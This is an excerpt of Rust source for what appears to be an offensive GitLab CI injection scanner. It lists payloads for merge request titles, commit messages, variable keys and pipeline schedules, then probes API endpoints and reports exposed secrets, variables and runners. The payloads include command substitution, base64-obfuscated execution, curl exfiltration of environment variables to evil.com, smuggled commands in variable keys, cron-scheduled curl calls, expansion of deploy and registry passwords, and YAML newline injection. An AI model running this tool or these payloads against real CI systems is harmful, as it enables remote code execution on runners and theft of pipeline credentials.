...
const GITLABCI_INJECTION_VECTORS: &[(&str, &str, &str)] = &[
    (
        "MR title — command substitution",
        "$(whoami)",
        "merge_request",
    ),
    ("MR title — backticks", "`id`", "merge_request"),
    (
        "MR description — env exfil",
        "$(curl https://evil.com/?d=$(env))",
        "merge_request",
    ),
    (
        "MR description — secret exfil",
        "$(cat $CI_PROJECT_DIR/.gitlab-ci.yml)",
        "merge_request",
    ),
    (
        "Commit message — command substitution",
        "$(printenv)",
        "push",
    ),
    ...
    (
        "Variable key — injection",
        "CI_IMAGE;curl https://evil.com",
        "variable",
    ),
    (
        "Pipeline schedule — cron inject",
        "* * * * * $(whoami)",
        "schedule",
    ),
    (
        "Pipeline schedule — command",
        "0 2 * * * curl https://evil.com",
        "schedule",
    ),
    (
        "MR title — $variable expansion",
        "$CI_REGISTRY_PASSWORD",
        "merge_request",
    ),
    (
        "MR description — ${variable}",
        "${CI_DEPLOY_PASSWORD}",
        "merge_request",
    ),
    ...
    (
        "MR title — base64 exec",
        "$(echo d2hvYW1p | base64 -d)",
        "merge_request",
    ),
    (
        "Commit message — newline + run",
        "test\n  script:\n    - curl https://evil.com",
        "push",
    ),
];
...
pub async fn inject(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    ...
    println!(
        "{} {} injection vectors, {} API endpoints",
        "[*]".cyan().bold(),
        GITLABCI_INJECTION_VECTORS.len(),
        GITLABCI_ENDPOINTS.len()
    );
            ...
            Ok(resp) => {
                ...
                let has_gitlab = resp.headers().get("x-gitlab").is_some()
                    || resp
                        .headers()
                        .get("x-request-id")
                        .map(|v| v.to_str().unwrap_or("").contains("gitlab"))
                        .unwrap_or(false);
                ...
                let has_vars = is_json
                    && (body.contains("\"key\"")
                        || body.contains("\"variable\"")
                        || body.contains("CI_"));
                let has_runners = is_json
                    && (body.contains("\"runner\"")
                        || body.contains("\"shared\"")
                        || body.contains("\"is_shared\""));
                let has_secrets = is_json
                    && (body.contains("\"secret\"")
                        || body.contains("\"token\"")
                        || body.contains("\"deploy_token\""));
                let tag = if accessible {
                    if has_secrets {
                        "SECRETS".red().bold().to_string()
                    } else if has_vars {
                        "VARIABLES".red().bold().to_string()
                    } else if has_runners {
                        "RUNNERS".red().bold().to_string()
                    } else {
    ...
    for (name, payload, trigger) in GITLABCI_INJECTION_VECTORS {
            ...
            .await
        {
            Ok(resp) => {
                ...
                let triggered =
                    (status == 201 || status == 200) && !is_html && (has_gitlab_hdr || is_json);
                let has_error = resp_body.contains("\"error\"")
                    || resp_body.contains("\"invalid\"")
                    || resp_body.contains("\"message\"");
    ...
    let has_runners = found
        .iter()
        .any(|n| n.contains("runner") || n.contains("Runner"));
    let has_secrets = found
        .iter()
        .any(|n| n.contains("Secret") || n.contains("Trigger") || n.contains("Deploy"));
    if has_secrets {
        println!(
            "{} [CRITICAL] Secrets/tokens accessible — credential extraction!",
            "[!]".red().bold()
        );
    }
    if has_vars {
        println!(
            "{} [HIGH] CI variables accessible — secret exfiltration!",
            "[!]".red().bold()
        );
    }
    if has_runners {
        println!(
            "{} [HIGH] Runners accessible — runner abuse possible!",
            "[!]".red().bold()
        );
    }
    if !results.is_empty() {
        let has_cmd = results.iter().any(|n| {
            n.contains("command")
                || n.contains("backtick")
                || n.contains("IFS")
                || n.contains("base64")
        });
        let has_var_exp = results
            .iter()
            .any(|n| n.contains("variable") || n.contains("$"));
        let has_yaml = results
            .iter()
            .any(|n| n.contains("newline") || n.contains("YAML"));
        if has_cmd {
            println!(
                "{} [CRITICAL] Command substitution injection — RCE on runner!",
                "[!]".red().bold()
            );
        }
        if has_var_exp {
            println!(
                "{} [CRITICAL] Variable expansion injection — CI secret exfiltration!",
                "[!]".red().bold()
            );
        }
        if has_yaml {
            println!(
                "{} [HIGH] YAML injection — pipeline config modification!",
                "[!]".red().bold()
            );
        }
    }
